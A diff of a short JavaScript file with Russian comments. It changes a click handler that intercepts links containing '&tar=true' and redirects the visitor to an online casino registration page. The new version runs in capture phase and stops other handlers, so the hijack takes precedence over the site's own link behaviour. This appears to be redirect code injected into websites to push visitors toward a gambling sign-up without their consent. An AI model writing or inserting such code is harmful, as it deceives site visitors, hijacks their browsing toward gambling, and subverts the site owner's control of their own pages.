@@ -1,23 +1,21 @@
-document.addEventListener('click', function (e) {
+document.addEventListener('click', function(e) {
   const link = e.target.closest('a');
   if (!link) return;
 
-  // Карта: подстрока в URL => ссылка для редиректа
   const redirectMap = {
-    '&tar=true': 'https://1wilib.life/casino/list?open=register&p=pg75',
+    '&tar=true': 'https://1wilib.life/casino/list?open=register&p=pg75'
   };
 
-  try {
-    const href = link.href;
+  const href = link.href;
 
-    for (const substring in redirectMap) {
-      if (href.includes(substring)) {
-        e.preventDefault();
-        window.location.href = redirectMap[substring];
-        break;
-      }
+  for (const substring in redirectMap) {
+    if (href.includes(substring)) {
+      e.preventDefault(); // Отменяем стандартное действие
+      e.stopImmediatePropagation(); // Останавливаем всплытие и другие обработчики
+      
+      // Делаем редирект
+      window.location.href = redirectMap[substring];
+      return;
     }
-  } catch (err) {
-    console.error('Ошибка при обработке ссылки:', err);
   }
-});
+}, true); // `true` = capture phase (перехват до других обработчиков)
